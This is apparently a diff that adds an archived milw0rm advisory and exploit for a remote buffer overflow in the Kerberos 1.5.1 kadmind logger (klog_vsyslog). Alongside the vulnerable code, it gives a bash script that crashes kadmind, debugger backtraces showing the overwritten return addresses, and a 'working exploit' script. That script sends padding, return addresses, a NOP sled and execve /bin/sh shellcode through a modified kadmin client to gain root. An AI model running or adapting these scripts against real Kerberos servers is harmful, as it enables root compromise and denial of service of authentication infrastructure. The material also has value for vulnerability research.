@@ -1,0 +1,145 @@
+Kerberos Version 1.5.1 Kadmind Remote Root Buffer Overflow Vulnerability
+
+
+The Issue:
+Remotely exploitable buffer overflow vulnerability in Kerberos kadmind service
+
+The Versions:
+krb5-1.5.1 (Latest version from http://eb.mit.edu/Kerberos/ )
+krb5-server-1.4.3-5.1 (Latest version from Fedora yum update)
+
+The Environment:
+Linux Fedora Core 5 x86_64 bit
+
+The Overview:
+
+There is a remotly exploitable overflow bug in Kerberos kadmind service that can be triggered during the administration
+of principals via kadmin or kadmin.local and either in a local context or a remote context, which will allow the attacker
+the possibility of having Kerberos server yield the permissions of the user that it is running a, usually root. It can
+also be used as a denail of service against kadmind.
+
+root 1834 1 0 22:29 ? 00:00:00 /usr/kerberos/sbin/krb5kdc
+root 6600 1 0 23:00 ? 00:00:00 /usr/kerberos/sbin/kadmind
+
+To trigger the exploit, a valid user account has to first of all authenticate to the Kerberos service and have a ticket
+generated, the user therefor must be or have access to an admin account that can access thre remote kadmind
+service, which limits the scope of the attack slightly. However, this still allows anyone with the most limited access
+to the service to kill it or gain root access and as such should be treated as critical.
+
+A trivial issue encountered was that the kadmin client would filter out crazy strings passed to it, so you can't use it
+by default to send in shellcode and return addresses. To get around that we modify the client source code a bit to
+honour our malicious values and then upload it to our user directory, and as if by magic it will no longer bail when it
+encounters these strings ;)
+
+
+Following is the vulnerable function with the unused code, ifdefs and comments removed to make it easier to read
+
+/* krb5-1.5.1/src/lib/kadm5/logger.c
+
+static int
+klog_vsyslog(int priority, const char *format, va_list arglist)
+{
+char outbuf[KRB5_KLOG_MAX_ERRMSG_SIZE];
+char *syslogp;
+
+strncpy(outbuf, ctime(&now) + 4, 15);
+cp += 15;
+
+syslogp = &outbuf[strlen(outbuf)];
+
+vsprintf(syslogp, format, arglist);
+
+*/
+
+
+By exersizing any of the option presented to us in kadmin, we should be able to trigger this little bug, including:
+
+add_principal
+delete_principal
+modify_principal
+change_password
+get_principal
+... and on.....
+
+Another nice feature to kadmin is that it is possible to run it from the command line, and as such this makes crafting
+a payload much easier :) by running the following script, it should be possible to trigger this bug and kill kadmind:
+
+##########
+
+#!/bin/bash
+ADDIT="get_principal"
+ATTACK="cr4yz33_h4xx0r"
+KADMIN="/usr/kerberos/sbin/kadmin"
+KADMINDP="`netstat -anp --ip | grep kadmin | grep LISTEN | awk '{print $4}'| sed -e s/0.0.0.0://`"
+PRINCIPAL="root/admin@OPEN-SECURITY.ORG"
+TARGET=coredump.open-security.org
+TRIGGAH="`perl -e 'print "A" x 5000'`"
+
+$KADMIN -s $TARGET:$KADMINDP -p $PRINCIPAL -q "$ADDIT -pw $ATTACK $TRIGGAH"
+
+##########
+
+
+After running this script with various sized buffer values, we get faults in the following locations:
+
+// With 2000 A's //
+#0 0x0000003a2ed427d5 in vfprintf () from /lib64/libc.so.6
+#1 0x0000003a2ed5fc79 in vsprintf () from /lib64/libc.so.6
+#2 0x00002aaaaaabb2ea in klog_vsyslog (priority=5,
+format=0x40c4e0 "Request: %s, %s, %s, client=%s, service=%s, addr=%s", arglist=0x7ffffdb40e60)
+at logger.c:854
+#3 0x4141414141414141 in ?? ()
+#4 0x4141414141414141 in ?? ()
+#5 0x4141414141414141 in ?? ()
+....
+
+
+// With 5000 A's (On the Fedora version) //
+#0 0x00002aaaab65fc90 in strlen () from /lib64/libc.so.6
+#1 0x00002aaaab63088b in vfprintf () from /lib64/libc.so.6
+#2 0x00002aaaab6ca8ad in __vsprintf_chk () from /lib64/libc.so.6
+#3 0x00002aaaaabd2283 in krb5_klog_syslog () from /usr/lib64/libkadm5srv.so.5
+#4 0x4141414141414141 in ?? ()
+#5 0x4141414141414141 in ?? ()
+....
+
+
+// With 30000 a's //
+#0 0x0000003a2ed750ae in mempcpy () from /lib64/libc.so.6
+#1 0x0000003a2ed69a5b in _IO_default_xsputn_internal () from /lib64/libc.so.6
+#2 0x0000003a2ed44294 in vfprintf () from /lib64/libc.so.6
+#3 0x0000003a2ed5fc79 in vsprintf () from /lib64/libc.so.6
+#4 0x00002aaaaaabb2ea in klog_vsyslog (priority=5,
+format=0x40c4e0 "Request: %s, %s, %s, client=%s, service=%s, addr=%s", arglist=0x7fffbe94f220)
+at logger.c:854
+#5 0x6161616161616161 in ?? ()
+....
+
+
+
+In our vulnerable code we have the function klog_vsyslog, which is a lame attempt to create a custom logger, as we can
+see by the result of this advisory. 
+
+
+Here is the working exploit:
+
+#!/bin/bash
+ADDIT="get_principal"
+ATTACK="cr4yz33_h4xx0r"
+KADMIN="kadmin"
+KADMINDP="`netstat -anp --ip | grep kadmin | grep LISTEN | awk '{print
+$4}'| sed -e s/0.0.0.0://`"
+PRINCIPAL="root/admin@OPEN-SECURITY.ORG"
+TARGET=debauch.open-security.org
+TRIGGAH="`perl -e 'print "A" x 900'`PAD`perl -e 'printf "\xc0\xfa\xff\xbf\x88\xf8\xff\xbf" x 20'``perl -e 'print 
+"C" x 6'``perl -e 'print "\x90" x 50'`
+`echo -e "\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"`"
+
+$KADMIN -s $TARGET:$KADMINDP -p $PRINCIPAL -q "$ADDIT $TRIGGAH"
+
+###end
+
+Reference:
+http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=500
+
+# milw0rm.com [2007-04-10]
